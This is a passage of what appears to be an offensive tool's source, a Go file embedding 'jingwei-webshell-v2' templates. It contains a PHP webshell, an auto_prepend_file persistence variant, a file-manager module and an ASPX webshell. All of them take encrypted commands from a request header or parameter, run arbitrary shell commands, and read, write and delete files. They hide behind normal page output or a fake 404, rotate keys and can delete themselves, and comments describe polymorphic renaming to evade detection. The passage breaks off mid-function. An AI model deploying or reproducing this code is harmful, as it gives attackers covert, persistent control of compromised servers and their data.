if ($jwOp === 'R') { $jwNk = jw_arg($jwP); if ($jwNk === false || strlen($jwNk) !== 32) { jw_no(); } @file_put_contents($jwOverride, base64_encode($jwNk), LOCK_EX); @chmod($jwOverride, 0600); $jwSelf = @file_get_contents(__FILE__); if ($jwSelf !== false) { $jwPatched = str_replace(base64_encode($jw0), base64_encode($jwNk), $jwSelf); if ($jwPatched !== $jwSelf) { @file_put_contents(__FILE__, $jwPatched, LOCK_EX); } } jw_reply($jwNk, ''); exit; }
jw_no();
?>`

// shellV2PHPPersistTemplate is the auto_prepend_file variant: non-protocol
// requests restore the previous error_reporting level and return, so the real
// script renders normally. Only requests carrying the keyed carrier are
// answered and exit. It must not emit anything or change request-wide settings
// on the pass-through path.
const shellV2PHPPersistTemplate = `<?php
(static function () {
$jwEr = error_reporting(0);
$jw0 = base64_decode('{{KEY}}');
$jwC = '{{CARRIER}}';
$jwB = '{{BUILD}}';
$jwDir = rtrim(sys_get_temp_dir(), DIRECTORY_SEPARATOR);
$jwReplay = $jwDir . DIRECTORY_SEPARATOR . '.' . $jwB . '.r';
$jwOverride = $jwDir . DIRECTORY_SEPARATOR . '.' . $jwB . '.k';
function jw_b64d($s) { $s = strtr($s, '-_', '+/'); $r = strlen($s) % 4; if ($r) { $s .= str_repeat('=', $r == 1 ? 3 : 4 - $r); } return base64_decode($s, true); }
function jw_b64e($s) { return rtrim(strtr(base64_encode($s), '+/', '-_'), '='); }
function jw_rnd($n) { if (function_exists('random_bytes')) { return random_bytes($n); } return openssl_random_pseudo_bytes($n); }
function jw_open($k, $t) { $r = jw_b64d($t); if ($r === false || strlen($r) < 37 || ord($r[0]) !== 2) { return false; } $h = substr($r, 0, 21); $n = substr($r, 1, 12); $ts = unpack('N2', substr($r, 13, 8)); $tsv = $ts[1] * 4294967296 + $ts[2]; if (abs(time() - $tsv) > 300) { return false; } $ct = substr($r, 21); $tag = substr($ct, -16); $ct = substr($ct, 0, -16); $p = @openssl_decrypt($ct, 'aes-256-gcm', $k, OPENSSL_RAW_DATA, $n, $tag, $h); if ($p === false) { return false; } return $p; }
function jw_seal($k, $p) { $n = jw_rnd(12); $h = "\x02" . $n . pack('N2', 0, time()); $tag = ''; $ct = @openssl_encrypt($p, 'aes-256-gcm', $k, OPENSSL_RAW_DATA, $n, $tag, $h, 16); if ($ct === false) { return ''; } return jw_b64e($h . $ct . $tag); }
function jw_arg($p) { $a = explode('|', $p, 3); if (count($a) < 2) { return false; } return jw_b64d($a[1]); }
function jw_reply($k, $out) { $out = (string)$out; $f = '0'; if (strlen($out) >= 256 && function_exists('gzencode')) { $z = gzencode($out, 6); if ($z !== false) { $out = $z; $f = '1'; } } $d = jw_b64e($out); $pad = jw_b64e(jw_rnd(1 + (ord(jw_rnd(1)) % 24))); echo jw_seal($k, 'OK|' . $f . '|' . $d . '|' . $pad); }
function jw_seen($path, $token) { $fp = @fopen($path, 'c+'); if (!$fp) { return true; } if (!flock($fp, LOCK_EX)) { fclose($fp); return true; } $now = time(); $keep = array(); $data = stream_get_contents($fp); foreach (explode("\n", (string)$data) as $line) { $parts = explode(' ', trim($line)); if (count($parts) === 2 && $now - (int)$parts[1] < 600) { $keep[$parts[0]] = (int)$parts[1]; } } if (isset($keep[$token])) { flock($fp, LOCK_UN); fclose($fp); return true; } $keep[$token] = $now; $out = ''; foreach ($keep as $kk => $tt) { $out .= $kk . ' ' . $tt . "\n"; } ftruncate($fp, 0); rewind($fp); fwrite($fp, $out); fflush($fp); flock($fp, LOCK_UN); fclose($fp); return false; }
function jw_info() { $u = ''; if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) { $pw = @posix_getpwuid(@posix_geteuid()); if (is_array($pw) && isset($pw['name'])) { $u = (string)$pw['name']; } } if ($u === '') { $u = (string)@get_current_user(); } $j = @json_encode(array('os' => PHP_OS, 'sapi' => PHP_SAPI, 'php' => PHP_VERSION, 'file' => __FILE__, 'dir' => __DIR__, 'document_root' => isset($_SERVER['DOCUMENT_ROOT']) ? (string)$_SERVER['DOCUMENT_ROOT'] : '', 'script' => isset($_SERVER['SCRIPT_FILENAME']) ? (string)$_SERVER['SCRIPT_FILENAME'] : '', 'user_ini_filename' => (string)@ini_get('user_ini.filename'), 'user_ini_cache_ttl' => (int)@ini_get('user_ini.cache_ttl'), 'auto_prepend_file' => (string)@ini_get('auto_prepend_file'), 'open_basedir' => (string)@ini_get('open_basedir'), 'disable_functions' => (string)@ini_get('disable_functions'), 'server' => isset($_SERVER['SERVER_SOFTWARE']) ? (string)$_SERVER['SERVER_SOFTWARE'] : '', 'user' => $u, 'cwd' => (string)@getcwd(), 'tmp' => (string)@sys_get_temp_dir())); return $j === false ? '{}' : $j; }
{{PHP_FILE_SUPPORT}}
$jwK = $jw0;
if (is_file($jwOverride)) { $jwRaw = @file_get_contents($jwOverride); if ($jwRaw !== false) { $jwNew = base64_decode(trim($jwRaw), true); if ($jwNew !== false && strlen($jwNew) === 32) { $jwK = $jwNew; } } }
$jwToken = '';
if (strpos($jwC, 'X-') === 0) { $jwH = 'HTTP_' . strtoupper(str_replace('-', '_', $jwC)); if (isset($_SERVER[$jwH])) { $jwToken = $_SERVER[$jwH]; } }
if (!is_string($jwToken) || $jwToken === '') { if (isset($_POST[$jwC])) { $jwToken = $_POST[$jwC]; } elseif (isset($_GET[$jwC])) { $jwToken = $_GET[$jwC]; } }
if (!is_string($jwToken) || $jwToken === '') { error_reporting($jwEr); return; }
$jwP = jw_open($jwK, $jwToken);
if ($jwP === false || jw_seen($jwReplay, $jwToken)) { error_reporting($jwEr); return; }
$jwOp = substr($jwP, 0, 1);
if ($jwOp === 'P') { jw_reply($jwK, ''); exit; }
if ($jwOp === 'I') { jw_reply($jwK, jw_info()); exit; }
if ($jwOp === 'E') { $jwCmd = jw_arg($jwP); if ($jwCmd === false) { error_reporting($jwEr); return; } @set_time_limit(0); $jwFull = DIRECTORY_SEPARATOR === '\\' ? 'cmd.exe /c ' . $jwCmd . ' 2>&1' : $jwCmd . ' 2>&1'; $jwOut = @shell_exec($jwFull); if ($jwOut === null) { $jwOut = ''; } jw_reply($jwK, $jwOut); exit; }
if ($jwOp === 'F') { jw_fs_dispatch($jwK, $jwP); exit; }
if ($jwOp === 'D') { $jwOk = @unlink(__FILE__); @unlink($jwOverride); @unlink($jwReplay); jw_reply($jwK, $jwOk ? '__JWDEL_OK__' : '__JWDEL_FAIL__'); exit; }
if ($jwOp === 'R') { $jwNk = jw_arg($jwP); if ($jwNk === false || strlen($jwNk) !== 32) { error_reporting($jwEr); return; } @file_put_contents($jwOverride, base64_encode($jwNk), LOCK_EX); @chmod($jwOverride, 0600); $jwSelf = @file_get_contents(__FILE__); if ($jwSelf !== false) { $jwPatched = str_replace(base64_encode($jw0), base64_encode($jwNk), $jwSelf); if ($jwPatched !== $jwSelf) { @file_put_contents(__FILE__, $jwPatched, LOCK_EX); } } jw_reply($jwNk, ''); exit; }
error_reporting($jwEr);
})();
?>`

// shellV2PHPFileSupport implements the optional file-manager op (F) shared by
// the standalone PHP shell and the prepend variant. It is injected before
// identifier polymorphism so every helper name is randomized with the rest of
// the payload. Paths and payloads travel base64-encoded inside the encrypted
// envelope; the deployed shell file itself is protected from modification so a
// file-manager mistake cannot brick the channel.
const shellV2PHPFileSupport = `function jw_fs_err($m) { return 'ERR' . "\n" . jw_b64e($m); }
function jw_fs_arg($a, $i) { if (!isset($a[$i])) { return ''; } $v = jw_b64d($a[$i]); return $v === false ? '' : $v; }
function jw_fs_num($a, $i) { return isset($a[$i]) ? (int)$a[$i] : 0; }
function jw_fs_abs($p) { if ($p === '') { $p = (string)@getcwd(); } return @realpath($p); }
function jw_fs_parent($abs) { $p = @dirname($abs); return ($p === '' || $p === '.' || $p === $abs) ? $abs : $p; }
function jw_fs_self($abs) { $s = @realpath(__FILE__); return $s !== false && $abs !== false && $abs === $s; }
function jw_fs_root($abs) { $p = rtrim(str_replace('\\', '/', $abs), '/'); return $p === '' || preg_match('/^[A-Za-z]:$/', $p) === 1; }
function jw_fs_type($full) { if (@is_dir($full)) { return 'd'; } if (@is_file($full)) { return 'f'; } if (@is_link($full)) { return 'l'; } return 'o'; }
function jw_fs_mode($full) { $m = @fileperms($full); return $m === false ? '-' : sprintf('%04o', $m & 07777); }
function jw_fs_cmp($a, $b) { $da = $a['t'] === 'd' ? 0 : 1; $db = $b['t'] === 'd' ? 0 : 1; if ($da !== $db) { return $da - $db; } return strcasecmp($a['n'], $b['n']); }
function jw_fs_list($p) { $abs = jw_fs_abs($p); if ($abs === false || !@is_dir($abs)) { return jw_fs_err('not a directory'); } $names = @scandir($abs); if ($names === false) { return jw_fs_err('permission denied'); } $items = array(); foreach ($names as $n) { if ($n === '.' || $n === '..') { continue; } $full = $abs . DIRECTORY_SEPARATOR . $n; $t = jw_fs_type($full); $s = 0; if ($t !== 'd') { $s = @filesize($full); if ($s === false) { $s = 0; } } $mt = @filemtime($full); $items[] = array('n' => $n, 't' => $t, 's' => (int)$s, 'm' => $mt === false ? 0 : (int)$mt, 'o' => jw_fs_mode($full)); } usort($items, 'jw_fs_cmp'); $trunc = 0; if (count($items) > 3000) { $items = array_slice($items, 0, 3000); $trunc = 1; } $out = 'LIST' . "\n" . jw_b64e($abs) . "\n" . jw_b64e(jw_fs_parent($abs)) . "\n" . count($items) . "\n" . $trunc; foreach ($items as $it) { $out .= "\n" . jw_b64e($it['n']) . "\t" . $it['t'] . "\t" . $it['s'] . "\t" . $it['m'] . "\t" . $it['o']; } return $out; }
function jw_fs_read($p, $off, $len) { if ($off < 0) { $off = 0; } if ($len < 0) { $len = 0; } if ($len > 1048576) { $len = 1048576; } $abs = jw_fs_abs($p); if ($abs === false || !@is_file($abs)) { return jw_fs_err('not a file'); } $size = @filesize($abs); if ($size === false) { return jw_fs_err('stat failed'); } if ($off > $size) { $off = $size; } $fp = @fopen($abs, 'rb'); if (!$fp) { return jw_fs_err('permission denied'); } if ($off > 0 && @fseek($fp, $off) !== 0) { @fclose($fp); return jw_fs_err('seek failed'); } $data = ''; $want = $len; while ($want > 0 && !feof($fp)) { $chunk = @fread($fp, $want > 65536 ? 65536 : $want); if ($chunk === false || $chunk === '') { break; } $data .= $chunk; $want -= strlen($chunk); } @fclose($fp); $eof = ($off + strlen($data)) >= $size ? 1 : 0; return 'DATA' . "\n" . jw_b64e($abs) . "\n" . $off . "\n" . $size . "\n" . $eof . "\n" . jw_b64e($data); }
function jw_fs_write($p, $off, $start, $data) { if ($p === '' || strpos($p, "\0") !== false) { return jw_fs_err('invalid path'); } if ($off < 0) { $off = 0; } $abs = jw_fs_abs($p); if ($abs === false) { $dir = @realpath(@dirname($p)); if ($dir === false) { return jw_fs_err('parent not found'); } $abs = $dir . DIRECTORY_SEPARATOR . @basename($p); } if (jw_fs_self($abs)) { return jw_fs_err('shell file is protected'); } if (@is_dir($abs)) { return jw_fs_err('is a directory'); } $fp = @fopen($abs, $start ? 'wb' : 'c+b'); if (!$fp) { return jw_fs_err('permission denied'); } if ($start) { @ftruncate($fp, 0); } if ($off > 0 && @fseek($fp, $off) !== 0) { @fclose($fp); return jw_fs_err('seek failed'); } $written = 0; $total = strlen($data); $ok = true; while ($written < $total) { $n = @fwrite($fp, substr($data, $written)); if ($n === false || $n === 0) { $ok = false; break; } $written += $n; } @fflush($fp); @fclose($fp); if (!$ok) { return jw_fs_err('write failed'); } @clearstatcache(true, $abs); $size = @filesize($abs); if ($size === false) { $size = $off + $written; } return 'WROTE' . "\n" . jw_b64e($abs) . "\n" . $off . "\n" . $written . "\n" . $size; }
function jw_fs_rm($p, $rec) { if (@is_link($p) || @is_file($p)) { return @unlink($p); } if (!@is_dir($p)) { return false; } if (!$rec) { return @rmdir($p); } $names = @scandir($p); if ($names === false) { return false; } foreach ($names as $n) { if ($n === '.' || $n === '..') { continue; } if (!jw_fs_rm($p . DIRECTORY_SEPARATOR . $n, true)) { return false; } } return @rmdir($p); }
function jw_fs_delete($p, $rec) { $abs = jw_fs_abs($p); if ($abs === false) { return jw_fs_err('not found'); } if (jw_fs_root($abs)) { return jw_fs_err('refuse to delete root'); } if (jw_fs_self($abs)) { return jw_fs_err('shell file is protected'); } if (!jw_fs_rm($abs, $rec)) { return jw_fs_err('delete failed'); } return 'OK' . "\n" . jw_b64e($abs); }
function jw_fs_rename($src, $dst) { if ($src === '' || $dst === '' || strpos($src, "\0") !== false || strpos($dst, "\0") !== false) { return jw_fs_err('invalid path'); } $a = jw_fs_abs($src); if ($a === false) { return jw_fs_err('source not found'); } if (jw_fs_self($a)) { return jw_fs_err('shell file is protected'); } $b = jw_fs_abs($dst); if ($b === false) { $dir = @realpath(@dirname($dst)); if ($dir === false) { return jw_fs_err('target dir not found'); } $b = $dir . DIRECTORY_SEPARATOR . @basename($dst); } if (jw_fs_self($b)) { return jw_fs_err('shell file is protected'); } if (@file_exists($b)) { return jw_fs_err('target exists'); } if (!@rename($a, $b)) { return jw_fs_err('rename failed'); } return 'OK' . "\n" . jw_b64e($b); }
function jw_fs_mkdir($p) { if ($p === '' || strpos($p, "\0") !== false) { return jw_fs_err('invalid path'); } if (@is_dir($p)) { $abs = jw_fs_abs($p); return 'OK' . "\n" . jw_b64e($abs === false ? $p : $abs); } if (!@mkdir($p, 0755, true)) { return jw_fs_err('mkdir failed'); } $abs = jw_fs_abs($p); return 'OK' . "\n" . jw_b64e($abs === false ? $p : $abs); }
function jw_fs_chmod($p, $mode) { $abs = jw_fs_abs($p); if ($abs === false) { return jw_fs_err('not found'); } if (jw_fs_self($abs)) { return jw_fs_err('shell file is protected'); } if (!preg_match('/^[0-7]{3,4}$/', $mode)) { return jw_fs_err('invalid mode'); } $m = intval($mode, 8); if ($m < 0 || $m > 07777) { return jw_fs_err('invalid mode'); } if (!@chmod($abs, $m)) { return jw_fs_err('chmod failed'); } return 'OK' . "\n" . jw_b64e($abs); }
function jw_fs_dispatch($k, $p) { $raw = jw_arg($p); if ($raw === false) { jw_reply($k, jw_fs_err('bad request')); return; } $a = explode("\n", $raw); $act = isset($a[0]) ? $a[0] : ''; $out = jw_fs_err('unknown action'); if ($act === 'list') { $out = jw_fs_list(jw_fs_arg($a, 1)); } elseif ($act === 'read') { $out = jw_fs_read(jw_fs_arg($a, 1), jw_fs_num($a, 2), jw_fs_num($a, 3)); } elseif ($act === 'write') { $out = jw_fs_write(jw_fs_arg($a, 1), jw_fs_num($a, 2), jw_fs_num($a, 3) === 1, jw_fs_arg($a, 4)); } elseif ($act === 'delete') { $out = jw_fs_delete(jw_fs_arg($a, 1), jw_fs_num($a, 2) === 1); } elseif ($act === 'rename') { $out = jw_fs_rename(jw_fs_arg($a, 1), jw_fs_arg($a, 2)); } elseif ($act === 'mkdir') { $out = jw_fs_mkdir(jw_fs_arg($a, 1)); } elseif ($act === 'chmod') { $out = jw_fs_chmod(jw_fs_arg($a, 1), jw_fs_arg($a, 2)); } jw_reply($k, $out); }
`

const shellV2ASPXTemplate = `<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.IO.Compression" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Web" %>
<%@ Import Namespace="System.Web.Caching" %>
<script runat="server">
static readonly byte[] JW0 = Convert.FromBase64String("{{KEY}}");
static readonly string JWC = "{{CARRIER}}";
static readonly string JWF = ".{{BUILD}}.k";
static byte[] JWKEY = JW0;
static string JWB64E(byte[] b) { return Convert.ToBase64String(b).TrimEnd('=').Replace('+', '-').Replace('/', '_'); }
static byte[] JWB64D(string s) { s = s.Replace('-', '+').Replace('_', '/'); if (s.Length % 4 == 2) { s += "=="; } else if (s.Length % 4 == 3) { s += "="; } try { return Convert.FromBase64String(s); } catch { return null; } }
static byte[] JWH(byte[] key, string label) { using (HMACSHA256 h = new HMACSHA256(key)) { return h.ComputeHash(Encoding.UTF8.GetBytes(label)); } }
static byte[] JWCat(params byte[][] parts) { int n = 0; for (int i = 0; i < parts.Length; i++) { n += parts[i].Length; } byte[] o = new byte[n]; int p = 0; for (int i = 0; i < parts.Length; i++) { Buffer.BlockCopy(parts[i], 0, o, p, parts[i].Length); p += parts[i].Length; } return o; }
static long JWNow() { return (long)(DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalSeconds; }
static byte[] JWTS(long ts) { byte[] b = BitConverter.GetBytes(ts); if (BitConverter.IsLittleEndian) { Array.Reverse(b); } return b; }
static bool JWFE(byte[] a, byte[] b) { if (a.Length != b.Length) { return false; } int d = 0; for (int i = 0; i < a.Length; i++) { d |= a[i] ^ b[i]; } return d == 0; }
static string JWSeal(byte[] master, string plain) {
  byte[] enc = JWH(master, "jingwei-webshell-v2/enc");
  byte[] mac = JWH(master, "jingwei-webshell-v2/mac");
  byte[] iv = new byte[16];
  using (RandomNumberGenerator r = RandomNumberGenerator.Create()) { r.GetBytes(iv); }
  byte[] pt = Encoding.UTF8.GetBytes(plain);
  byte[] ct;
  using (Aes aes = Aes.Create()) { aes.Key = enc; aes.IV = iv; aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7; using (ICryptoTransform t = aes.CreateEncryptor()) { ct = t.TransformFinalBlock(pt, 0, pt.Length); } }
  byte[] head = JWCat(new byte[] { 2 }, iv, JWTS(JWNow()));
  byte[] body = JWCat(head, ct);
  byte[] tag;
  using (HMACSHA256 h = new HMACSHA256(mac)) { tag = h.ComputeHash(body); }
  return JWB64E(JWCat(body, tag));
}
static byte[] JWOpen(byte[] master, string token) {
  byte[] raw = JWB64D(token);
  if (raw == null || raw.Length < 73 || raw[0] != 2) { return null; }
  byte[] enc = JWH(master, "jingwei-webshell-v2/enc");
  byte[] mac = JWH(master, "jingwei-webshell-v2/mac");
  byte[] body = new byte[raw.Length - 32];
  Array.Copy(raw, body, body.Length);
  byte[] tag = new byte[32];
  Array.Copy(raw, body.Length, tag, 0, 32);
  byte[] want;
  using (HMACSHA256 h = new HMACSHA256(mac)) { want = h.ComputeHash(body); }
  if (!JWFE(tag, want)) { return null; }
  long ts = 0;
  for (int i = 13; i < 21; i++) { ts = (ts << 8) | (long)(body[i] & 0xff); }
  if (Math.Abs(JWNow() - ts) > 300) { return null; }
  byte[] iv = new byte[16];
  Array.Copy(body, 1, iv, 0, 16);
  byte[] ct = new byte[body.Length - 25];
  Array.Copy(body, 25, ct, 0, ct.Length);
  try {
    using (Aes aes = Aes.Create()) { aes.Key = enc; aes.IV = iv; aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7; using (ICryptoTransform t = aes.CreateDecryptor()) { return t.TransformFinalBlock(ct, 0, ct.Length); } }
  } catch { return null; }
}
static bool JWSeen(string token) { object prev = HttpRuntime.Cache.Add("jwn_" + token, "1", null, DateTime.UtcNow.AddMinutes(6), Cache.NoSlidingExpiration, CacheItemPriority.Default, null); return prev != null; }
static byte[] JWArg(string p) { string[] a = p.Split(new char[] { '|' }, 3); if (a.Length < 2) { return null; } return JWB64D(a[1]); }
static string JWReply(byte[] data) {
  string flag = "0"; byte[] payload = data;
  if (data.Length >= 256) {
    using (MemoryStream ms = new MemoryStream()) {
      using (GZipStream gz = new GZipStream(ms, CompressionMode.Compress, true)) { gz.Write(data, 0, data.Length); }
      payload = ms.ToArray(); flag = "1";
    }
  }
  byte[] pad = new byte[1 + (JWKEY[0] % 24)];
  using (RandomNumberGenerator r = RandomNumberGenerator.Create()) { r.GetBytes(pad); }
  return "OK|" + flag + "|" + JWB64E(payload) + "|" + JWB64E(pad);
}
static byte[] JWKey() { try { string path = Path.Combine(Path.GetTempPath(), JWF); if (File.Exists(path)) { byte[] raw = Convert.FromBase64String(File.ReadAllText(path).Trim()); if (raw.Length == 32) { JWKEY = raw; } } } catch { } return JWKEY; }
static void JW404() { HttpContext.Current.Response.StatusCode = 404; HttpContext.Current.Response.ContentType = "text/html"; HttpContext.Current.Response.Write("<html><body><h1>Not Found</h1></body></html>"); HttpContext.Current.Response.End(); }
static string JWFErr(string m) { return "ERR\n" + JWB64E(Encoding.UTF8.GetBytes(m ?? "error")); }
static string JWFOk(string m) { return "OK\n" + JWB64E(Encoding.UTF8.GetBytes(m ?? "")); }
static string JWFArg(string[] a, int i) { if (i >= a.Length) { return ""; } byte[] b = JWB64D(a[i]); return b == null ? "" : Encoding.UTF8.GetString(b); }
static long JWFNum(string[] a, int i) { long v = 0; if (i >= a.Length || !long.TryParse(a[i].Trim(), out v)) { return 0; } return v; }
static string JWFPath(string p) { if (string.IsNullOrEmpty(p)) { p = Directory.GetCurrentDirectory(); } return Path.GetFullPath(p); }
static string JWFTrim(string full) { return full.TrimEnd(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar); }
static bool JWFProtected(string full, string selfPath) {
  try {
    string c = JWFTrim(Path.GetFullPath(full));
    if (!string.IsNullOrEmpty(selfPath) && string.Equals(c, JWFTrim(Path.GetFullPath(selfPath)), StringComparison.OrdinalIgnoreCase)) { return true; }
    return string.Equals(c, JWFTrim(Path.GetFullPath(Path.Combine(Path.GetTempPath(), JWF))), StringComparison.OrdinalIgnoreCase);
  } catch { return false; }
}
static bool JWFRoot(string full) {
  string root = Path.GetPathRoot(full);
  return !string.IsNullOrEmpty(root) && string.Equals(JWFTrim(full), JWFTrim(root), StringComparison.OrdinalIgnoreCase);
}
static string JWFList(string p) {
  try {
    string full = JWFPath(p);
    if (!Directory.Exists(full)) { return JWFErr("not a directory"); }
    DirectoryInfo di = new DirectoryInfo(full);
    FileSystemInfo[] items = di.GetFileSystemInfos();
    Array.Sort(items, delegate(FileSystemInfo a, FileSystemInfo b) {
      bool da = (a.Attributes & FileAttributes.Directory) != 0;
      bool db = (b.Attributes & FileAttributes.Directory) != 0;
      if (da != db) { return da ? -1 : 1; }
      return string.Compare(a.Name, b.Name, StringComparison.OrdinalIgnoreCase);
    });
    bool trunc = items.Length > 3000;
    int n = trunc ? 3000 : items.Length;
    StringBuilder sb = new StringBuilder("LIST");
    sb.Append('\n').Append(JWB64E(Encoding.UTF8.GetBytes(full)));
    DirectoryInfo parent = di.Parent;
    sb.Append('\n').Append(JWB64E(Encoding.UTF8.GetBytes(parent == null ? full : parent.FullName)));
    sb.Append('\n').Append(n).Append('\n').Append(trunc ? "1" : "0");
    for (int i = 0; i < n; i++) {
      FileSystemInfo f = items[i];
      bool isDir = (f.Attributes & FileAttributes.Directory) != 0;
      bool isLink = (f.Attributes & FileAttributes.ReparsePoint) != 0;
      string t = isDir ? "d" : (isLink ? "l" : "f");
      long size = 0;
      if (!isDir) { try { size = ((FileInfo)f).Length; } catch { } }
      long mt = 0;
      try { mt = (long)(f.LastWriteTimeUtc - new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalSeconds; } catch { }
      sb.Append('\n').Append(JWB64E(Encoding.UTF8.GetBytes(f.Name))).Append('\t').Append(t).Append('\t').Append(size).Append('\t').Append(mt).Append('\t').Append("-");
    }
    return sb.ToString();
  } catch (Exception e) { return JWFErr(e.Message); }
}
static string JWFRead(string p, long off, int len) {
  if (off < 0) { off = 0; }
  if (len < 0) { len = 0; }
  if (len > 1048576) { len = 1048576; }
  try {
    string full = JWFPath(p);
    if (!File.Exists(full)) { return JWFErr("not a file"); }
    long size = new FileInfo(full).Length;
    if (off > size) { off = size; }
    using (FileStream fs = new FileStream(full, FileMode.Open, FileAccess.Read, FileShare.ReadWrite)) {
      fs.Seek(off, SeekOrigin.Begin);
      byte[] data = new byte[len];
      int total = 0;
      while (total < len) { int r = fs.Read(data, total, len - total); if (r <= 0) { break; } total += r; }
      byte[] body = new byte[total];
      Buffer.BlockCopy(data, 0, body, 0, total);
      return "DATA\n" + JWB64E(Encoding.UTF8.GetBytes(full)) + "\n" + off + "\n" + size + "\n" + ((off + total >= size) ? "1" : "0") + "\n" + JWB64E(body);
    }
  } catch (Exception e) { return JWFErr(e.Message); }
}
static string JWFWrite(string p, long off, bool start, byte[] data, string selfPath) {
  if (string.IsNullOrEmpty(p) || p.IndexOf('\0') >= 0) { return JWFErr("invalid path"); }
  if (off < 0) { off = 0; }
  if (data == null) { data = new byte[0]; }
  try {
    string full = JWFPath(p);
    string dir = Path.GetDirectoryName(full);
    if (string.IsNullOrEmpty(dir) || !Directory.Exists(dir)) { return JWFErr("parent not found"); }
    if (JWFProtected(full, selfPath)) { return JWFErr("shell file is protected"); }
    if (Directory.Exists(full)) { return JWFErr("is a directory"); }
    using (FileStream fs = new FileStream(full, start ? FileMode.Create : FileMode.OpenOrCreate, FileAccess.Write, FileShare.ReadWrite)) {
      if (start) { fs.SetLength(0); }
      fs.Seek(off, SeekOrigin.Begin);
      fs.Write(data, 0, data.Length);
      fs.Flush();
    }
    return "WROTE\n" + JWB64E(Encoding.UTF8.GetBytes(full)) + "\n" + off + "\n" + data.Length + "\n" + new FileInfo(full).Length;
  } catch (Exception e) { return JWFErr(e.Message); }
}
static string JWFDelete(string p, bool rec, string selfPath) {
  try {
    string full = JWFPath(p);
    if (!File.Exists(full) && !Directory.Exists(full)) { return JWFErr("not found"); }
    if (JWFRoot(full)) { return JWFErr("refuse to delete root"); }
    if (JWFProtected(full, selfPath)) { return JWFErr("shell file is protected"); }
    if (Directory.Exists(full)) { Directory.Delete(full, rec); }
    else { File.SetAttributes(full, FileAttributes.Normal); File.Delete(full); }
    return JWFOk(full);
  } catch (Exception e) { return JWFErr(e.Message); }
}
static string JWFRename(string src, string dst, string selfPath) {
  if (string.IsNullOrEmpty(src) || string.IsNullOrEmpty(dst) || src.IndexOf('\0') >= 0 || dst.IndexOf('\0') >= 0) { return JWFErr("invalid path"); }
  try {
    string a = JWFPath(src);
    if (!File.Exists(a) && !Directory.Exists(a)) { return JWFErr("source not found"); }
    if (JWFProtected(a, selfPath)) { return JWFErr("shell file is protected"); }
    string b = JWFPath(dst);
    string dir = Path.GetDirectoryName(b);
    if (string.IsNullOrEmpty(dir) || !Directory.Exists(dir)) { return JWFErr("target dir not found"); }
    if (JWFProtected(b, selfPath)) { return JWFErr("shell file is protected"); }
    if (File.Exists(b) || Directory.Exists(b)) { return JWFErr("target exists"); }
    if (Directory.Exists(a)) { Directory.Move(a, b); } else { File.Move(a, b); }
    return JWFOk(b);
  } catch (Exception e) { return JWFErr(e.Message); }
}
static string JWFMkdir(string p) {
  if (string.IsNullOrEmpty(p) || p.IndexOf('\0') >= 0) { return JWFErr("invalid path"); }
  try {
    string full = JWFPath(p);
    if (!Directory.Exists(full)) { Directory.CreateDirectory(full); }
    return JWFOk(full);
  } catch (Exception e) { return JWFErr(e.Message); }
}
static string JWFChmod(string p, string mode, string selfPath) {
  if (!System.Text.RegularExpressions.Regex.IsMatch(mode, "^[0-7]{3,4}$")) { return JWFErr("invalid mode"); }
  try {
    string full = JWFPath(p);
    if (!File.Exists(full) && !Directory.Exists(full)) { return JWFErr("not found"); }
    if (JWFProtected(full, selfPath)) { return JWFErr("shell file is protected"); }
    int m = Convert.ToInt32(mode, 8);
    FileAttributes fa = File.GetAttributes(full);
    if ((m & 0200) != 0) { fa &= ~FileAttributes.ReadOnly; } else { fa |= FileAttributes.ReadOnly; }
    File.SetAttributes(full, fa);
    return JWFOk(full);
  } catch (Exception e) { return JWFErr(e.Message); }
}
static string JWFDispatch(string raw, string selfPath) {
  string[] a = raw.Split(new char[] { '\n' }, -1);
  string act = a.Length > 0 ? a[0] : "";
  if (act == "list") { return JWFList(JWFArg(a, 1)); }
  if (act == "read") { return JWFRead(JWFArg(a, 1), JWFNum(a, 2), (int)JWFNum(a, 3)); }
  if (act == "write") { return JWFWrite(JWFArg(a, 1), JWFNum(a, 2), JWFNum(a, 3) == 1, a.Length > 4 ? JWB64D(a[4]) : null, selfPath); }
  if (act == "delete") { return JWFDelete(JWFArg(a, 1), JWFNum(a, 2) == 1, selfPath); }
  if (act == "rename") { return JWFRename(JWFArg(a, 1), JWFArg(a, 2), selfPath); }
  if (act == "mkdir") { return JWFMkdir(JWFArg(a, 1)); }
  if (act == "chmod") { return JWFChmod(JWFArg(a, 1), JWFArg(a, 2), selfPath); }
  return JWFErr("unknown action");
}
protected void Page_Load(object sender, EventArgs e) {
  string tk = Request.Headers[JWC];
  if (string.IsNullOrEmpty(tk)) { tk = Request.Form[JWC] ?? Request.QueryString[JWC]; }
  if (string.IsNullOrEmpty(tk)) { JW404(); return; }
  byte[] key = JWKey();
  byte[] pt = JWOpen(key, tk);
  if (pt == null || JWSeen(tk)) { JW404(); return; }
  string p = Encoding.UTF8.GetString(pt);
  string op = p.Substring(0, 1);
  if (op == "P") { Response.ContentType = "text/plain"; Response.Write(JWSeal(key, JWReply(new byte[0]))); return; }
  if (op == "E") {
    byte[] cb = JWArg(p);
    if (cb == null) { JW404(); return; }
    string cmd = Encoding.UTF8.GetString(cb);
    bool win = Environment.OSVersion.Platform == PlatformID.Win32NT;
    ProcessStartInfo si = new ProcessStartInfo();
    si.FileName = win ? "cmd.exe" : "/bin/sh";
    si.Arguments = win ? ("/c " + cmd) : ("-c \"" + cmd.Replace("\"", "\\\"") + "\"");
    si.UseShellExecute = false;
    si.RedirectStandardOutput = true;
    si.RedirectStandardError = true;
    si.CreateNoWindow = true;
    Process pr = Process.Start(si);
    string so = pr.StandardOutput.ReadToEnd();
    string se = pr.StandardError.ReadToEnd();
    pr.WaitForExit();
    Response.ContentType = "text/plain";
    Response.Write(JWSeal(key, JWReply(Encoding.UTF8.GetBytes(so + se))));
    return;
  }
  if (op == "F") {
    byte[] fb = JWArg(p);
    string fsOut = fb == null ? JWFErr("bad request") : JWFDispatch(Encoding.UTF8.GetString(fb), Request.PhysicalPath);
